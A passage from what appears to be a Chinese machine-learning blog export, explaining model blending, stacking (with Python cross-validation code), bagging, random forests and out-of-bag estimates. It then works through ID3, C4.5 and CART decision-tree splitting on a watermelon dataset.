x}_i)\\right)^2 \\] 这里有T个个体学习器，每个学习器用\\(h_t\\)表示，而\\(\\alpha_t\\)就是对应的权重。 这个优化问题很像之前讲的求解概率SVM（Platt模型）分为两阶段求解。这里我们首先用训练数据训练出所有的h，然后再做线性回归求出\\(\\alpha_t\\)。注意到这里要求\\(\\alpha_t \\ge 0\\)，来个拉格朗日函数？其实不用，通常我们可以忽略这个条件。以二分类为例如果\\(\\alpha_i\\)小于0，相当于把模型反过来用。（假如给你个错误率99%的模型，你反过来用正确率不就99%了么！） 如何得到\\(h_t\\)呢？这里我们将个体学习器称为初级学习器，用于结合的学习器称为次级学习器。首先从数据集中训练出初级学习器，然后”生成“一个新的数据集用于训练次级学习器。注意为了防止过拟合，我们需要在训练集上做训练得到初级学习器\\(h_t\\)，而在验证集上比较不同\\(\\alpha\\)的好坏。最终模型则在所有的数据上进行训练（数据量多可能使得模型效果更好） 步骤如下： 从训练集\\(D_{train}\\)中训练得到\\(h_1^-,h_2^-,\\cdots,h_t^-\\)，并对验证集\\(D_{val}\\)中的数据\\(({\\bf x_i},y_i)\\)做转换为新的数据集\\((\\Phi^-({\\bf x_i}),y_i)\\)，其中\\(\\Phi^-({\\bf x_i}) = (h_1^-({\\bf x_i}),h_2^-({\\bf x_i}),\\cdots,h_t^-({\\bf x_i}))\\) 用线性回归求解\\(\\alpha = Lin\\left(\\{(z_i, y_i)\\}\\right)\\) 最后，用所有的数据D求解得到\\(h_1,h_2,\\cdots,h_t\\)，组成特征变换向量\\(\\Phi({\\bf x}) = (h_1({\\bf x}),h_2({\\bf x}),\\cdots,h_t({\\bf x}))\\) 对于新数据x，\\(f({\\bf x}) = \\frac{1}{T}\\sum_{t=1}^T\\alpha_th_t({\\bf x})\\) Stacking Stacking相比Linear Blending来说，更加强大，然而也更容易过拟合。 Stacking做法和Linear Blending类似，首先从数据集中训练出初级学习器，然后”生成“一个新的数据集用于训练次级学习器。为了防止过拟合，采用K折交叉验证法求解。 一个直观的图如下： stacking 假设采用5折交叉验证，每个模型都要做满5次训练和预测，对于每一次： 从80%的数据训练得到一个模型\\(h_t\\)，然后预测训练集剩下的那20%，同时也要预测测试集。 每次有20%的训练数据被预测，5次后正好每个训练样本都被预测过了。 每次都要预测测试集，因此最后测试集被预测5次，最终结果取5次的平均。 回归问题，代码如下（get_oof就是上图的过程）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344_N_FOLDS = 5 # 采用5折交叉验证kf = KFold(n_splits=_N_FOLDS, random_state=42) # sklearn的交叉验证模块，用于划分数据def get_oof(clf, X_train, y_train, X_test): # X_train: 1000 * 10 # y_train: 1 * 1000 # X_test : 500 * 10 oof_train = np.zeros((X_train.shape[0], 1)) # 1000 * 1 Stacking后训练数据的输出 oof_test_skf = np.empty((_N_FOLDS, X_test.shape[0], 1)) # 5 * 500 * 1，oof_test_skf[i]代表第i折交叉验证产生的模型对测试集预测结果 for i, (train_index, test_index) in enumerate(kf.split(X_train)): # 交叉验证划分此时的训练集和验证集 kf_X_train = X_train[train_index] # 800 * 10 训练集 kf_y_train = y_train[train_index] # 1 * 800 训练集对应的输出 kf_X_val = X_train[test_index] # 200 * 10 验证集 clf.fit(kf_X_train, kf_y_train) # 当前模型进行训练 oof_train[test_index] = clf.predict(kf_X_val).reshape(-1, 1) # 对当前验证集进行预测， 200 * 1 oof_test_skf[i, :] = clf.predict(X_test).reshape(-1, 1) # 对测试集预测 oof_test_skf[i, :] : 500 * 1 oof_test = oof_test_skf.mean(axis=0) # 对每一则交叉验证的结果取平均 return oof_train, oof_test # 返回当前分类器对训练集和测试集的预测结果# 将数据换成你的数据X_train = np.random.random((1000, 10)) # 1000 * 10y_train = np.random.random_integers(0, 1, (1000,)) # 1000X_test = np.random.random((500, 10)) # 500 * 10# 将你的每个分类器都调用get_oof函数，并把它们的结果合并，就得到了新的训练和测试数据new_train,new_testnew_train, new_test = [], []for clf in [LinearRegression(), RandomForestRegressor()]: oof_train, oof_test = get_oof(clf, X_train, y_train, X_test) new_train.append(oof_train) new_test.append(oof_test)new_train = np.concatenate(new_train, axis=1)new_test = np.concatenate(new_test, axis=1)# 用新的训练数据new_train作为新的模型的输入，stacking第二层clf = RandomForestRegressor()clf.fit(new_train, y_train)clf.predict(new_test) 如果是分类问题，我们对测试集的结果就不能像回归问题一样直接取平均，而是分类器输出所有类别的概率，最后取平均。每个分类器都贡献了_N_CLASS(类别数)的维度。 修改get_oof函数如下即可： 1234567891011121314151617181920_N_CLASS = 2def get_oof(clf, X_train, y_train, X_test): # X_train: 1000 * 10 # y_train: 1 * 1000 # X_test : 500 * 10 oof_train = np.zeros((X_train.shape[0], _N_CLASS)) # 1000 * _N_CLASS oof_test = np.empty((X_test.shape[0], _N_CLASS)) # 500 * _N_CLASS for i, (train_index, test_index) in enumerate(kf.split(X_train)): kf_X_train = X_train[train_index] # 800 * 10 交叉验证划分此时的训练集和验证集 kf_y_train = y_train[train_index] # 1 * 800 kf_X_test = X_train[test_index] # 200 * 10 验证集 clf.fit(kf_X_train, kf_y_train) # 当前模型进行训练 oof_train[test_index] = clf.predict_proba(kf_X_test) # 当前验证集进行概率预测， 200 * _N_CLASS oof_test += clf.predict_proba(X_test) # 对测试集概率预测 oof_test_skf[i, :] ， 500 * _N_CLASS oof_test /= _N_FOLDS # 对每一则交叉验证的结果取平均 return oof_train, oof_test # 返回当前分类器对训练集和测试集的预测结果 上面的代码只做了两层，你想的话还可以在加几层，因此这个方法叫做stacking，堆叠。。 Bagging 前面的模型融合中都是得到了尽可能好而不同\\(h_t\\)，然后在进一步的进行处理，这些\\(h_t\\)往往是用不同的模型、同一模型的不同的超参数或者不同随机种子得到的。 要让分类器不同，还可以对训练样本进行采样，但如果采样出的每个子集都完全不同，则每个基学习器只用到了一小部分训练数据，甚至不足以进行有效学习，这就不能保证训练出的学习器好。我们可以考虑使用有重叠的采样子集。对此，Bagging算法采用Bootstrap（也称为自助法）进行采样。 Bootstrap为有放回的抽样，每次从m个样本的数据集D中抽取一个，重复m次，最终得到包含m个样本的采样集D‘。显然，数据集D中有一部分样本会在D'中出现，而一部分不会。可以做一个简单的估计，样本在m次采样过程中始终不会被采样到的概率是\\((1 - \\frac{1}{m})^m\\)，取极限得到： \\[ \\lim_{m\\rightarrow\\infty} \\ (1 - \\frac{1}{m})^m \\rightarrow \\frac{1}{e} \\approx 0.368 \\] 也就是说，每个基学习器用到了初始训练集中约63.2%的样本，剩下的36.8%的样本可以用来做”袋外估计“(out-of-bag estimate)，即这些没有用到的样本可以来做验证集，这会在随机森林种讲解。 假设有个学习器，则我们可以描述Bagging的算法如下： 对 \\(t=1,2,\\ldots, T\\) ​ 通过bootstrap算法抽样得到一个大小为m的采样集D'，在该采样集D'上训练得到\\(h_t\\) 最后得到T个\\(h_t\\)，用均匀混合法得到最后的模型。 PS：Bagging是英文Bootstrap Aggregation的缩写。其示意图如下: bagging 从方差和偏差的角度看，Bagging主要降低的是方差，如果基算法对随机性比较敏感，那么bagging的结果会比较好。如不剪枝的决策树、神经网络。 随机森林 前面介绍过决策树算法，决策树算法对数据比较敏感，方差比较大，而刚提过的Bagging算法想让方差较大，最后用投票或平均值来减少最后模型的方差。 如果把决策树和Bagging结合起来呢？这就得到了随机森林。 随机森林的过程为： 对 \\(t=1,2,\\ldots, T\\) 通过对原始数据集D做Bootstrap抽样，得到大小为m的数据集\\(\\tilde{D}_t\\) 在\\(\\tilde{D}_t\\)上运行基分类器学习算法\\(A(\\tilde{D}_t)\\)，得到基分类器\\(h_t\\) 返回\\(G={\\rm Uniform}(\\{h_t\\})\\) （就是对所有\\(h_t\\)做均匀混合） 其中基分类器\\(h_t\\)的训练算法\\(A(\\tilde{D}_t)\\)为： random-forest 可以看出： 随机森林一开始采用自助法Bootstrap抽取数据 对于每棵树，在待分裂的节点上，随机选择K个特征 每一棵树为CART 上面的两种做法都是为了让基学习器尽可能好而不同。通常来说，K &lt;&lt; d(原始特征个数)，随机森林的效率能进一步提升。随机森林的提出者建议，每个\\(h_t\\)每次分裂时都对特征都重采样一遍，这样效果会更好。若\\(k = d\\)，则与传统决策树相同，一般而言，推荐\\(k = \\log_2d\\) 或者\\(k = \\sqrt{d}\\) 袋外估计 随机森林采用Bootstrap来进行有放回的抽样，前面我们知道，抽取足够多次后，一个样本大约有36.8%的概率不被抽到，因此我们可以画出如下表格，用来假设每个基学习器用到的数据： 数据 / 基学习器 \\(h_1\\) \\(h_2\\) \\(h_3\\) \\(\\cdots\\) \\(h_T\\) \\(({\\bf x_1},y_1)\\) \\(\\tilde{D}_1\\) * \\(\\tilde{D}_3\\) \\(\\tilde{D}_T\\) \\(({\\bf x_2},y_2)\\) * * \\(\\tilde{D}_3\\) \\(\\tilde{D}_T\\) \\(({\\bf x_3},y_3)\\) * \\(\\tilde{D}_2\\) * \\(\\tilde{D}_T\\) \\(\\cdots\\) \\(({\\bf x_m},y_m)\\) \\(\\tilde{D}_1\\) * * * 在表格中，*表示基分类器\\(h_t\\)没有用到数据\\(({\\bf x_i},y_i)\\), 这时候就称该样本为\\(h_t\\)的袋外估计样本(OOB)。 在以往单个模型中，比如单个决策树，对于\\(h_t\\)没有使用过的数据，就是\\(h_t\\)对应的那列标*的，可以用来计算\\(h_t\\)的误差，来衡量\\(h_t\\)的好坏。但是在Bagging方法中其实没有必要这样做，对于Bagging方法我们要得到的是最后合起来的模型G，可能单个模型\\(h_t\\)不好，但是最后合起来的模型G却很好。 所以，我们想要估计的是最后模型G的误差。如果要用这些袋外估计样本，我们只需要保证这些样本不被“污染”，比如对于上面的表格中，\\(({\\bf x_m},y_m)\\) 是\\(h_2,h_3, h_T\\)的袋外估计样本，可以用作\\(G_m^- = \\rm average(h_2,h_3, h_T)\\)的验证资料。对于其它的样本如果没被用到也可以构造出一个\\(G_i^-\\)，因此整个模型G的误差可以用下式计算： \\[ E_{\\rm oob}(G) = \\frac{1}{m} \\sum_{i=1}^m {\\rm err}(y_i, G_i^-({\\bf x}_i)) \\] 因此，在Bagging算法中，得到了模型G后就能马上知道它的效果如何，因为它可以通过\\(E_{oob}\\)来做一个自我验证，对超参数进行调整。与之前的验证方法相比，有了OOB数据和\\(E_{oob}\\)以后，既不用将数据集分为两份（验证集和训练集），也不用在确定好超参数以后重新训练模型了。 随机森林的特征选择 对于线性模型来说，特征的重要性由w的分量\\(w_i\\)体现出来，\\(|w_i|\\)越大，说明特征越重要（指的是相对其它特征）。但非线性模型则困难得多。 而随机森林可以用特殊的方法得出特征的重要性。基本原理是：如果特征 \\(j\\) 比较重要，如果往这个特征上塞入一些噪声，模型的表现肯定会变差。如何塞入噪声呢？ 加入服从均匀分布或高斯分布的随机值？这样有个小问题，就是原始的数据可能不服从这样的分布，加入噪声后，原始的分布可能被改变。 因此，可以对 \\(\\{x_{i,j}\\}_{i=1}^m\\) 的做一个重新的排列，这样该特征的分布就不会发生变化。记重排列特征 \\(j\\) 上的值以后得到的数据集为\\(\\mathcal{D}^{(p)}\\)，特征 \\(j\\) 的重要性可以通过统计上称为排列测试 (permutation test)的方法进行估计： \\[ {\\rm importance}(j) = {\\rm performance}(\\mathcal{D}) - {\\rm performance}(\\mathcal{D}^{(p)}) \\] 这里，\\({\\rm performance}(\\mathcal{D}^{(p)})\\)需要用重排列后的数据重新训练模型。 不过随机森林可以不用重新训练。前面提到过，可以用\\(E_{oob}\\)直接估计模型的性能，因此随机森林可以用下面的公式进行估计： \\[ {\\rm importance}(j) = E_{\\rm oob}(G) - E_{\\rm oob}^{(p)}(G) \\] 注意，这里的后一项是\\(E_{\\rm oob}^{(p)}(G)\\)而非\\(E_{\\rm oob}(G^{(p)})\\)，就是说我们是在OOB集合上做排序，而非在训练集上。 那么如何计算\\(E_{\\rm oob}^{(p)}(G)\\)呢？当我们要估计第 \\(j\\) 个特征的重要性时，可以这样做： 当我们要计算\\(h_t({\\bf x_i})\\)的时候，\\(\\bf x_i\\)为\\(h_t\\)的OOB数据，此时可以用随机其它的OOB数据点的第 \\(j\\) 个特征代替\\(x_{ij}\\)。因为OOB数据没有参与训练，得到的结果比较准确。 参考资料 机器学习技法 - 林轩田 《机器学习》 - 周志华 关于Stacking方面还可以查阅： Stacking Learning在分类问题中的使用 Kaggle机器学习之模型融合（stacking）心得","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』决策树","slug":"machine-learning-decision-tree","date":"2018-04-19T04:29:06.000Z","updated":"2020-11-22T03:06:47.392Z","comments":true,"path":"machine-learning-decision-tree/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-decision-tree/","excerpt":"本文将介绍一个简单常见的机器学习方法--决策树。包括但不限于： ID3 C4.5 CART 决策树剪枝","text":"本文将介绍一个简单常见的机器学习方法--决策树。包括但不限于： ID3 C4.5 CART 决策树剪枝 决策树简介 什么是决策树呢？下面的图来自西瓜书，这就是一棵决策树，这个决策树用来判断一个瓜是否位好瓜。 decision-tree-example 对于一个瓜，首先看其纹理， 纹理模糊，说明是坏瓜 纹理稍糊，还得看其触感，如果触感硬滑为好瓜，触感软粘为坏瓜 纹理清晰，则接下来看根蒂.... 可以看出，决策树是一个可解释性很强的模型，用数据结构里的树来描述的话，是一棵多叉树，其中间结点代表决策步骤，叶子结点代表决策结果（或者说类别标签），而从根结点到叶子结点则描述了我们决策的过程。 不过，如何训练决策树呢？给定训练数据，可能存在多棵能拟合数据的决策树，如果要求解全局最优的决策树，那么是一个NP问题，因此，我们往往采用贪心法建立次优决策树。 采用贪心法建立决策树的框架如下（采用分治法（Divide and conquer）递归的建树）： decision-tree-algorithm 上图中，有2种情形使得递归返回， 情形1：即代码2-4行，当前结点的样本都属于同一类别，无需划分，递归返回 情形2：即代码5-7行，在当前属性集为空，或是所有样本在所有属性上取值都相同，无法进一步划分，所以返回 很简单是不是！我们只需要搞定第8行就可以了，如何选择最优划分属性呢？这就是不同贪心算法采用的不同策略了。 PS: 周志华的西瓜书中，认为第12行应该标记完然后return；我觉得是错误的。因为还有其它取值非空的\\(D_v\\)。因此这里我将图上的return去除了。 ID3与信息增益 一般而言，我们希望决策树的分支结点所包含的样本尽可能属于同一类别，即结点的纯度越来越高。而ID3中采用信息增益来衡量“纯度”的变化，从而选择划分点。 信息论与概率统计中，熵（Entropy）用来表示随机变量不确定性的大小，熵越大，不确定性越大。 设随机变量D有d个取值\\(\\{a_1,a_2,\\cdots, a_d\\}\\), 取值取值为\\(a_i\\)的概率为\\(p_i\\), 则随机变量的熵定义为： \\[ H(D) = -\\sum_{i=1}^dp_i\\log p_i\\tag{2-1} \\] 计算时约定当p = 0时，\\(p_i\\log p_i = 0\\) 。因为熵只依赖于X的分布，所以可以将\\(H(D)\\)写为\\(H(p)\\) 应用在分类数据集中，\\(p_i\\)可以表示第i个类别占总样本的比重。 接着介绍条件熵（conditional entropy），即给定随机变量a后，D剩余的不确定性（熵）: \\[ H(D|A)= \\sum_{i=1}^dp(A=a_i)H(D|A=a_i)\\tag{2-2} \\] 看不懂条件熵的式子？其实就是按特征A的取值划分数据，对取值为\\(a_i\\)的数据计算熵，然后乘以取值为\\(a_i\\)的概率。 信息增益(information gain)描述的是，给定随机变量A后，X所减少的不确定性(即熵 - 条件熵)： \\[ IG(D|A) = H(D) - H(D | A) \\tag{2-3} \\] 一般而言，信息增益越大，说明选择属性A来进行划分所获得的“纯度\"提升越大。因此，著名的ID3决策树学习算法就是用信息增益来划分属性的。 例子 以周志华的西瓜书中西瓜数据2.0为例： decision-tree-data-watermelon-2.0 该数据共有17条，我们可以用这个数据来学习一棵判断一个瓜是否为好瓜的决策树。 首先看好瓜出现了8次，坏瓜出现了9次，因此可以用式2-1计算出根结点的熵为： \\[ H(D) =-\\sum_{i=1}^2p_i\\log p_i= - (\\frac{8}{17}\\log_2\\frac{8}{17}+\\frac{9}{17}\\log_2\\frac{9}{17}) = 0.998 \\] 接着，查看可选取的特征有：{色泽、根蒂、敲声、纹理、脐部、触感} 先查看色泽特征，有三种取值，{青绿， 乌黑，浅白}， 色泽为青绿的时候，有{1, 4, 6, 10, 13, 17} 6个样例，其中好瓜为{1,4,6} 色泽为乌黑时有{2, 3, 7, 8, 9, 15} 6个样例，其中好瓜为{2,3,7,8} 色泽为浅白时有{5, 11, 12, 14, 16} 5个样例，其中好瓜为{5} 因此我们用式子2-2计算条件熵： \\[ \\begin{align*} H(D | 色泽) &amp;= \\sum_{i=1}^3p(A=a_i)H(D|A=a_i) \\\\ &amp;=p(A=青绿)H(D|A=青绿) +p(A=乌黑)H(D|A=乌黑)+p(A=浅白)H(D|A=浅白) \\\\ &amp;=\\frac{6}{17}\\left( - (\\frac{3}{6}\\log_2\\frac{3}{6} + \\frac{3}{6}\\log_2\\frac{3}{6}) \\right) + \\frac{6}{17}\\left( - (\\frac{4}{6}\\log_2\\frac{4}{6} + \\frac{2}{6}\\log_2\\frac{2}{6}) \\right) + \\frac{5}{17}\\left( - (\\frac{1}{5}\\log_2\\frac{1}{5} + \\frac{4}{5}\\log_2\\frac{4}{5}) \\right)\\\\ &amp;=\\frac{6}{17}*1.000 + \\frac{6}{17}*0.918 + \\frac{5}{17}*0.722\\\\ &amp;= 0.8893 \\end{align*} \\] 最后用2-3计算给定了色泽特征的信息增益： \\[ IG(D|色泽) = H(D) - H(D | 色泽) = 0.998-0.8893=0.109 \\] 同理计算出其它特征的信息增益， \\[ \\begin{align*} &amp;IG(D|根蒂) = 0.143；IG(D|敲声) =0.141\\\\ &amp;IG(D|纹理) = 0.381；IG(D|脐部) =0.289\\\\ &amp;IG(D|触感) = 0.006； \\end{align*} \\] 因为纹理的信息增益最大，所以会选纹理作为这次的划分特征。 根据前面讲的决策树算法框架，会将数据集根据纹理的取值划分， 纹理清晰：{1, 2, 3, 4, 5, 6, 8, 10, 15} 纹理稍糊: {7, 9, 13, 14, 17} 纹理模糊: {11, 12, 16} 然后，建立递归的建立三棵子树，不过子树中就没有纹理特征了。 以纹理清晰的子树为例，有9个样例(设为\\(D^1\\)用来和原始数据进行区分)， \\[ H(D^1) =-\\sum_{i=1}^2p_i\\log p_i= - (\\frac{7}{9}\\log_2\\frac{7}{9}+\\frac{2}{9}\\log_2\\frac{2}{9}) =0.7642 \\] 可以用{色泽、根蒂、敲声、脐部、触感}这五个特征计算信息增益，来选择信息增益最大的特征，从而进一步划分。 这里继续以色泽特征的信息增益计算为例：{1, 2, 3, 4, 5, 6, 8, 10, 15} 有三种取值，{青绿， 乌黑，浅白}， 色泽为青绿的时候，有{1, 4, 6, 10} 4个样例，其中好瓜为{1, 4, 6} 色泽为乌黑时有{2, 3, 8, 15} 4个样例，其中好瓜为{2, 3, 8} 色泽为浅白时有{5} 1个样例，其中好瓜为{5} \\[ \\begin{align*} H(D^1 | 色泽) &amp;= \\sum_{i=1}^3p(A=a_i)H(D^1|A=a_i) \\\\ &amp;=p(A=青绿)H(D^1|A=青绿) +p(A=乌黑)H(D^1|A=乌黑)+p(A=浅白)H(D^1|A=浅白) \\\\ &amp;=\\frac{4}{9}\\left( - (\\frac{3}{4}\\log_2\\frac{3}{4} + \\frac{1}{4}\\log_2\\frac{1}{4}) \\right) + \\frac{4}{9}\\left( - (\\frac{3}{4}\\log_2\\frac{3}{4} + \\frac{1}{4}\\log_2\\frac{1}{4}) \\right) + \\frac{1}{9}\\left( - (\\frac{1}{1}\\log_2\\frac{1}{1} + \\frac{0}{1}\\log_2\\frac{0}{1}) \\right)\\\\ &amp;=\\frac{4}{9}*0.8113 + \\frac{4}{9}*0.8113 + \\frac{1}{9}*0\\\\ &amp;= 0.7215 \\end{align*} \\] 因此信息增益为: \\[ IG(D^1|色泽) = H(D^1) - H(D^1 | 色泽) = 0.7642-0.7215=0.043 \\] 类似可以算出其它的信息增益，然后选最大进行划分。 最终的决策树即为本文一开始给出的图，这里再贴出来方便读者查看： decision-tree-example C4.5 ID3有一些不足的地方： 选择分裂变量时会倾向于选择类别较多的变量 只能处理类别变量，不能处理连续性变量（实数的） 不能处理缺失值 下面来看看C4.5是如何改进的。 增益率 信息增益对可取值数目较多的特征有所偏好（你可以想象极端情况，只有一个取值的时候，信息增益为0），为减少这种偏好的影响，C4.5决策树算法采用增益率： \\[ {\\rm Gain\\_ratio}(D|A) = \\frac{IG(D|A)}{H(A)} \\tag{3-1} \\] 2-4只有分母是仿佛我们没见过的？其实就是特征A的熵，之前我们计算H(D)是按D的类别（好瓜、坏瓜），而H(A)则按A的取值来计算。 如以上面的样例数据，再次以色泽为例， \\[ H(色泽) = -\\sum_{i=1}^3p_i\\log_2p_i = -(\\frac{6}{17}\\log_2\\frac{6}{17} + \\frac{6}{17}\\log_2\\frac{6}{17}+\\frac{5}{17}\\log_2\\frac{5}{17}) = 1.580 \\] 注意的是，增益率对可取值数目较少的特征有所偏好，因此C4.5并不是直接选取增益率最大的特征作为划分，而是先从候选特征中找出信息增益高于平均水平的特征，然后再从中选出增益率最高的。 连续变量处理 C4.5中，处理连续变量的方法是对连续变量离散化。 如我们有一个连续的特征A，共有n个不同的取值，将这些取值从小到大进行排序，得到： \\(\\{a_1,a_2,...,a_n\\}\\) 这样，可以在相邻的取值\\(a^i\\)和\\(a^{i+1}\\)中间点t处进行切分，将数据划分为两部分，一部分小于等于t，另一部分大于t。 可能的划分点有n-1种：\\(t \\in \\{\\frac{a_1 + a_2}{2},\\frac{a_2 + a_3}{2},\\cdots,\\frac{a_{n-1} + a_n}{2} \\}\\) 这样，在n - 1个取值中选择最优划分点即可。 缺失值处理 在真实数据中，往往会遇到不完整的样本，即样本中某些特征式缺失的。那么要如何处理呢？ 要处理缺失值，需要解决两个问题： 如何在属性值缺失的情况下进行划分属性选择？ 给定划分属性，若样本在该属性上的值缺失，如何对样本进行划分？ 给定训练数据集D和属性a，令\\(\\tilde{D}\\)表示D中在属性a上没有缺失值的样本子集。对于问题1，我们尽可根据\\(\\tilde{D}\\)来判断属性a的优劣，假定a有V个可取值\\(\\{a^1,a^2,\\cdots,a^V\\}\\)，令\\(\\tilde{D}^v\\)表示\\(\\tilde{D}\\)中在属性a上取值为\\(a^v\\)的样本，\\(\\tilde{D}_k\\)表示\\(\\tilde{D}\\)中属于第k类的样本子集，则显然有\\(\\tilde{D} = \\bigcup_{k=1}^K\\tilde{D}_k = \\bigcup_{v=1}^V\\tilde{D}^v\\) 假定我们为每个样本x赋予一个权重\\(w_x\\)，并定义 \\[ \\rho = \\frac{\\sum_{x \\in \\tilde{D}}w_x}{\\sum_{x \\in D}w_x}\\\\ \\tilde{p}_k = \\frac{\\sum_{x \\in \\tilde{D}_k}w_x}{\\sum_{x \\in \\tilde{D}}w_x}\\\\ \\tilde{r}_v = \\frac{\\sum_{x \\in \\tilde{D}^v}w_x}{\\sum_{x \\in \\tilde{D}}w_x} \\] 直观上看，对属性a， \\(\\rho\\) 表示无缺失值样本所占的比例 \\(\\tilde{p}_k\\)表示无缺失样本中第k类的比例 \\(\\tilde{r}_v\\)表示无缺失样本在属性a上取值\\(a^v\\)的样本所占的比例 显然\\(\\sum_{k=1}^K\\tilde{p}_k=1; \\ \\sum_{v=1}^V\\tilde{r}_v =1\\) 基于上述定义，可以将信息增益2-3推广为 \\[ Gain(D, a) =\\rho \\times Gain(\\tilde{D}, a) = \\rho\\times\\left( H(\\tilde{D}) - \\sum_{v=1}^V\\tilde{r}_vH(\\tilde{D}^v)) \\right)\\\\ H(\\tilde{D^v})= -\\sum_{k=1}^K \\tilde{p}_k \\log_2 \\tilde{p}_k \\] 其实上式和原来的差不多，只是计算熵和条件熵的时候，采用的是没有缺失的样本子集\\(\\tilde{D}\\)，并且是加权的结果，然后最后信息增益乘以\\(\\tilde{D}\\)占\\(D\\)的加权比重 对于问题2 若样本x在划分属性a上的取值已知，则将x划入与其取值对应的子结点。 取值未知，则将x同时划入所有的子结点，且样本权值在属性值\\(a^v\\)对应的子结点调整为\\(\\tilde{r}_v \\cdot w_x\\)，即让同一个样本以不同的概率划入不同的子结点中 例子 下面的例子以西瓜数据2.0\\(\\alpha\\)为例： decision-tree-data-missing-value 学习开始时，根节点包含全部17个样本，各个样例的权值为1。以特征色泽为例，无缺失的有14个样本，其中，包含正例6个，负例8个。因此： \\[ \\begin{align*} H(\\tilde{D^v}) &amp;= -\\sum_{k=2}^K \\tilde{p}_k \\log_2 \\tilde{p}_k \\\\&amp;= -(\\frac{6}{14}\\log_2\\frac{6}{14}+\\frac{8}{14}\\log_2\\frac{8}{14}) = 0.985 \\end{align*} \\] \\(\\tilde{D}^1,\\tilde{D}^2,\\tilde{D}^3\\)分别表示特征色泽上取值为“青绿\",\"乌黑”，以及“浅白”的样本子集，有： \\[ \\begin{align*} H(\\tilde{D^1}) &amp;= -(\\frac{2}{4}\\log_2\\frac{2}{4}+\\frac{2}{4}\\log_2\\frac{2}{4}) = 1.000\\\\ H(\\tilde{D^2}) &amp;= -(\\frac{4}{6}\\log_2\\frac{4}{6}+\\frac{2}{6}\\log_2\\frac{2}{6}) = 0.918\\\\ H(\\tilde{D^3}) &amp;= -(\\frac{0}{4}\\log_2\\frac{0}{4}+\\frac{4}{4}\\log_2\\frac{4}{4}) = 0.000 \\end{align*} \\] 因此，样本子集\\(\\tilde{D}\\)上属性“色泽”的信息增益为 : \\[ \\begin{align*} Gain(D, a)&amp; = \\rho\\times\\left( H(\\tilde{D}) - \\sum_{v=1}^V\\tilde{r}_vH(\\tilde{D}^v)) \\right)\\\\ &amp;= \\frac{14}{17} *\\left(0.985 - (\\frac{4}{14} * 1+\\frac{6}{14} * 0.918+ \\frac{4}{14}* 0) \\right)\\\\ &amp;= \\frac{14}{17} * 0.306 \\\\ &amp; = 0.252 \\end{align*} \\] 其它类别依次类推。最后发现纹理取得最大信息增益。 {1, 2, 3, 4, 5, 6, 15}进入纹理= 清晰分支 {7, 9, 13, 14, 17} 进入纹理= 稍糊分支 {11, 12, 16}进入纹理=模糊分支 对于编号8的样本，它缺失，因此同时进入三个分支中，但权重分别调整为\\(\\frac{7}{15},\\frac{5}{15},\\frac{3}{15}\\)，编号10同理。 CART算法 CART算法想必你也有所耳闻，其全称为classification and regression tree，即分类与回归树。从这个名字就可以发现它很强大，因为它可分类可回归！ CART基本上和之前的决策树算法框架相同，不过CART假设决策树为二叉树，左边分支为取值“是\", 右边分支取值为”否“。此外，其划分的策略也不是信息增益或信息增益率。 分类树生成 对于分类问题，采用基尼指数（Gini index）来判断分界点。假设有K个类，属于第k个类的概率为\\(p_k\\)，则基尼指数为： \\[ {\\rm Gini(D)}= \\sum_{k=1}^Kp_k(1-p_k) = 1 -\\sum_{k=1}^Kp_k^2\\tag{4-1} \\] 基尼指数反应了从数据集中抽取两个样本，其类别不一致的概率。因此Gini(D)越小，则数据集的纯度越高。也可以说，Gini(D)越大表示了集合D的不确定性越大。因此，划分的时候我们采用的是基尼指数最小的属性作为划分属性。 若在特征A的条件下，样本D根据特征A的某一可能取值a被分割为\\(D_1=\\{(x,y) \\in D|A(x) = a\\},\\ D_2=D-D_1\\)，集合D的基尼指数定义为: \\[ {\\rm Gini(D, A)} = \\frac{|D_1|}{|D|}{\\rm Gini(D_1)} + \\frac{|D_2|}{|D|}{\\rm Gini(D_2)}\\tag{4-2} \\] 4-2是不是和条件熵2-2也很类似? 关于基尼指数和熵的关系可以看下图（图来自李航老师）： gini-entropy-classification-error 可以看出二者非常接近，此外，我们可以在\\(p_i=1\\)对\\(-\\log p_i\\)进行泰勒展开： \\[ \\begin{align*} f(p_i) &amp;= -\\log p_i\\\\ f(p_i&#39;) &amp;= f(p_i) + f&#39;(p_i)(p_i-1) = f(1) +f&#39;(1) (p_i-1) = 1-p_i \\end{align*} \\] 带入信息熵得： \\[ \\sum_{i} p_i\\log p_i \\approx \\sum_i p_i(1-p_i) \\] 即基尼系数！虽说他们数值上接近，但是gini的计算相比熵要简单的多，所以会更加的高效。 对于分类树和ID3的算法基本上相同，不过CART是二叉树，因此不像之前按特征划分，而是按特征取值划分。 对于给定的结点数据集为D，对于每一个特征A，对其所有可能的取值a，根据样本点对A=a的测试为“是”或“否\"将D分割成\\(D_1,D_2\\)两部分，利用4-2计算A=a的基尼系数，从中选取基尼系数最小的特征以及对应的切分点作为最优特征与最优切分点，从现结点生成两个子结点，将训练数据集分配到两个子结点中去。 类似之前的算法递归调用步骤1直到满足停止条件即可。 可以看出，CART由于每次都是二分裂（划分成两部分），不像ID3是多分裂的，因此也没有ID3的倾向于取值较多的变量的缺陷。 回归树生成 回归树采用平方误差最小化为准则。 如何做呢？选择第j个特征\\(x^{(j)}\\)和它的取值s，作为切分变量和切分点，并定义两个区域： \\[ R_1(j,s) = \\{x|x^{(j)} \\le s\\} \\\\ R_2(j,s) = \\{x|x^{(j)} \\gt s\\} \\] PS： 这里真实中一般不直接用取值s来作为切分点，而先把特征的取值排序\\(\\{v_1,v_2,\\cdots,v_n\\}\\)，然后可能的阈值有：\\(\\{\\frac{v_1 + v_2}{2},\\frac{v_2 + v_3}{2},\\cdots,\\frac{v_{n-1} + v_n}{2} \\}\\)。这里和C4.5中处理连续变量的方法一样。 然后采用平方误差损失求解最优的切分特征j 和切分点s: \\[ \\min_{j, s} \\left[ \\min_{c_1} \\sum_{x_i \\in R_1(j, s)} (y_i -c_1)^2 + \\min_{c_2} \\sum_{x_i \\in R_2(j, s)} (y_i -c_2)^2 \\right ] 